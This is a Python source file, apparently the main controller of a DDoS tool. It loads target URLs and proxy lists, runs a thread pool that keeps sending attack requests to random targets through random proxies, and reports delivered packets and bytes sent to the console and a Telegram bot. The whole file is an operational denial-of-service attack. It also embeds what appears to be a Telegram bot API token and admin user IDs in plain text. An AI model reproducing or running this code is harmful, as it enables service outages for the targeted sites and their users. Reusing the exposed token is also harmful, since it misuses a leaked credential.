import time
import datetime
import threading
from threading import Lock
from files.workers_pool import *
from files.targets_manager import *
from files.proxy_manager import *
from files.attack import *
from files.requests_generator import *

from files.config import *

config = load_config()

#BOT SETTINGS
BOT_ENABLED = False
API_TOKEN = '1484879304:AAEk2YvY3zR03J234RnbpyR53SUYacdjvX4'
USE_ADMIN_LIST = True
ADMINS = [472519122, 1028805497]
#BOT SETTINGS

class Stats:
    def notify(self, message):
        if message[0] == 'successfully connected to proxy':
            self.add_good_proxy()
        elif message[0] == 'unable to connect to proxy':
            self.add_bad_proxy()
        elif message[0] == 'packet was not sent':
            self.add_bad()
        elif message[0] == 'packet was sent':
            self.add_good()
            self.add_bytes(message[1])

    def __init__(self, start_time):
        self.__lock = Lock()
        self.__start_time = start_time
        self.__bytes = 0
        self.__good = 0
        self.__bad = 0
        self.__good_proxy = 0
        self.__bad_proxy = 0

    def add_good(self, cnt = 1):
        self.__lock.acquire()
        self.__good += cnt
        self.__lock.release()
    
    def add_bad(self, cnt = 1):
        self.__lock.acquire()
        self.__bad += cnt
        self.__lock.release()

    def add_good_proxy(self, cnt = 1):
        self.__lock.acquire()
        self.__good_proxy += cnt
        self.__lock.release()

    def add_bad_proxy(self, cnt = 1):
        self.__lock.acquire()
        self.__bad_proxy += cnt
        self.__lock.release()

    def add_bytes(self, cnt = 1):
        self.__lock.acquire()
        self.__bytes += cnt
        self.__lock.release()

    def get_good(self):
        return self.__good

    def get_bad(self):
        return self.__bad

    def get_good_proxy(self):
        return self.__good_proxy

    def get_bad_proxy(self):
        return self.__bad_proxy

    def get_bytes(self):
        return self.__bytes

    def get_start_time(self):
        return self.__start_time.strftime("%d.%m.%Y, %H:%M:%S")
class DDoS:
    def __load(self):
        self.__target_manager.load_from_file('targets.txt')
        self.__proxy_manager.load_from_file('resources/proxies.txt', config)

        print('Loaded proxies count: {0}'.format(len(self.__proxy_manager)))

    def get_stats(self):
        return self.__stats

    def __init__(self):
        self.__proxy_manager = ProxyManager()
        self.__target_manager = TargetManager()
        self.__weapon = Weapon(config)
        self.__stats = Stats(datetime.datetime.now())
        self.__weapon.add_observer(self.__stats)

        self.__load()

    def run(self):
        pool = WorkersPool(config.THREAD_COUNT)
        pool.start()

        while True:
            while pool.get_len() < config.THREAD_COUNT:
                pool.add_task(Task(self.__weapon.attack_url, args=(self.__target_manager.get_rand(), self.__proxy_manager.get_rand())))

        pool.join()

ddos = DDoS()
ddos_thread = threading.Thread(target=ddos.run)
ddos_thread.start()

my_types = ['Kb', 'Mb', 'Gb', 'Tb']
my_cnts = ['K', 'M', 'B', 'T']


def convert_bytes(bytes):
    if bytes < 1024:
        return None

    id = -1
    while bytes / 1024 >= 1 and id + 1 < len(my_types):
        bytes /= 1024
        id += 1
    
    return [bytes, my_types[id]]

def convert_cnt(cnt):
    if cnt < 1000:
        return cnt

    id = -1
    while cnt / 1000 >= 1 and id + 1 < len(my_cnts):
        cnt /= 1000
        id += 1
    
    return '{0:.2f}'.format(cnt) + my_cnts[id]

def gen_packages_stats():
    stats = ddos.get_stats()
    packets = max(stats.get_good()+stats.get_bad(), 1)
    delivered = '✅ Packages delivered: {1:.1f}% ({0})'.format(convert_cnt(stats.get_good()), stats.get_good()/(packets)*100)
    bad = '❗️ Errors while submitting: {1:.1f}% ({0})'.format(convert_cnt(stats.get_bad()), stats.get_bad()/(packets)*100)
    proxy_connections = max(stats.get_good_proxy() + stats.get_bad_proxy(), 1)
    good_proxy_connections = '✅ Successful proxy connections: {1:.1f}% ({0})'.format(convert_cnt(stats.get_good_proxy()), stats.get_good_proxy()/(proxy_connections)*100)
    proxy_errors = '⛔️ Proxy connection errors: {1:.1f}% ({0})'.format(convert_cnt(stats.get_bad_proxy()), stats.get_bad_proxy()/(proxy_connections)*100)
    converted = convert_bytes(stats.get_bytes())
    if converted == None:
        bytes = 'ℹ️ Bytes sent: {0}'.format(stats.get_bytes())
    else:
        bytes = 'ℹ️ Bytes sent: {0} ({1:.2f} {2})'.format(stats.get_bytes(), converted[0], converted[1])

    return delivered + '\n' + bad + '\n' + good_proxy_connections + '\n' + proxy_errors + '\n' + bytes


if config.ENABLE_CONSOLE_LOG:
    def print_stat(timeout = 60):
        stats = ddos.get_stats()
        last = 0
        while True:
            start_time = 'Start time (UTC): {0}'.format(stats.get_start_time())
            packages_stats = gen_packages_stats()
            b = stats.get_bytes()
            delta = b - last
            last = b
            converted = convert_bytes(delta)
            if converted == None:
                bytes = 'ℹ️ Delta bytes sent: {0}'.format(delta)
            else:
                bytes = 'ℹ️ Delta bytes sent: {0} ({1:.2f} {2})'.format(delta, converted[0], converted[1])
            message_text = start_time + '\n' + packages_stats + '\n' + bytes
            print(message_text)
            print('-------------------')
            time.sleep(timeout)

    logging = threading.Thread(target=print_stat, args=(config.CONSOLE_LOG_TIMEOUT,))
    logging.start()

if BOT_ENABLED:
    import telebot
    bot = telebot.TeleBot(API_TOKEN)

    @bot.message_handler(commands=['stats'])
    def send_stats(message):
        if not USE_ADMIN_LIST or message.from_user.id in ADMINS:
            start_time = 'Start time (UTC): {0}'.format(ddos.get_stats().get_start_time())
            packages_stats = gen_packages_stats()
            message_text = start_time + '\n' + packages_stats
            bot.send_message(message.chat.id, message_text)

    bot.infinity_polling()
        
ddos_thread.join()
logging.join()